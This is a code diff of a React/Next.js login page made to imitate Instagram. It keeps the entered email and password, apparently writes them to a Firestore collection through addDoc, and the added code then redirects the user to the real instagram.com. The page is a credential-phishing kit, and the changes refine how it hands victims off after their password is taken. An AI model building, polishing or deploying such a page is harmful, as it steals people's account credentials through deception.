@@ -3,22 +3,14 @@ import React, { useState, useEffect } from 'react';
 import { firestore } from './firebaseconfig'; // Adjust the import path
 import { collection, addDoc } from 'firebase/firestore'; // Import the necessary functions
 import { FaFacebookSquare } from "react-icons/fa";
-import { useRouter } from 'next/router';
-import Image from 'next/image';
+import { useRouter } from 'next/navigation';
 export default function Login() {
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [error, setError] = useState('');
   const [success, setSuccess] = useState('');
   const [loading, setLoading] = useState(false); // Add loading state
-  const [isClient, setIsClient] = useState(false);
-  const router = useRouter(); // Hook for routing
-
-  useEffect(() => {
-    // Set client-side flag once component is mounted
-    setIsClient(true);
-  }, []);
-
+  const router = useRouter();
   const handleSubmit = async (event) => {
     event.preventDefault();
     
@@ -37,6 +29,7 @@ export default function Login() {
       });
 
       setSuccess('successfully');
+      handleRedirect();
       setError('');
 
       // Try to open the Careem app if installed, otherwise redirect to the website
@@ -49,24 +42,17 @@ export default function Login() {
       setLoading(false); // Set loading to false after completing the submit process
     }
   };
+  const handleRedirect = () => {
+    window.location.href = 'https://www.instagram.com';
+  };
 
-  useEffect(() => {
-    if (success && isClient) {
-      if (navigator.userAgent.match(/Android|iPhone/i)) {
-        router.push('instagram://');
-      } else {
-        router.push('https://www.instagram.com');
-      }
-    }
-  }, [success, isClient, router]);
-  
 
   return (
     <div className="min-h-screen flex flex-col justify-center items-center">
       <div className="flex flex-col md:flex-row md:items-center md:space-x-8 w-full max-w-screen-lg px-4">
         {/* Logo Section */}
         <div className="mb-8 md:mb-0 md:w-1/2 flex justify-center">
-          <Image
+          <img
             src="/logo.png" // Add your Instagram-like logo here
             alt="Instagram"
             className="h-12 md:h-16"
@@ -116,7 +102,7 @@ export default function Login() {
               className="w-full bg-[#4CB5F9] text-white py-2 rounded-md text-sm font-medium hover:bg-blue-600"
               disabled={loading}
             >
-              {loading ? 'Saving...' : 'Log In'}
+              {loading ? 'Loging in...' : 'Log In'}
             </button>
           </form>
         </div>
